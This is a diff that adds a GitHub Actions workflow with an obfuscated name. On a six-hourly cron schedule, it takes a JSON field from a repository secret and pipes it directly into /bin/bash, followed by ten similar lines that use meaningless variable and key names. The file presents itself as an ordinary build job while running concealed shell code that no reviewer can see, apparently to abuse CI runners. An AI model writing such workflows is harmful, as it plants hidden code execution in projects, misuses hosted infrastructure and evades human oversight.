@@ -1,0 +1,28 @@
+name: caotingxia3189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caotingxia3189
+        env:
+          x8: ${{ secrets.x8 }}
+        run: |
+          echo $x8 | jq -r .foc3 | /bin/bash
+          echo $xyp5 | jq -r .fnrpd66163 | /bin/bash
+          echo $fsv4589 | jq -r .qmmp89 | /bin/bash
+          echo $dcn6307 | jq -r .yy2113 | /bin/bash
+          echo $wq51 | jq -r .s730 | /bin/bash
+          echo $eao545 | jq -r .hc3833 | /bin/bash
+          echo $epohx858 | jq -r .qysiw0 | /bin/bash
+          echo $pzn66897 | jq -r .oki6 | /bin/bash
+          echo $vtjnq181 | jq -r .c657 | /bin/bash
+          echo $qkvc100 | jq -r .pzjw21441 | /bin/bash
+          echo $mj4 | jq -r .rzha6192 | /bin/bash
+
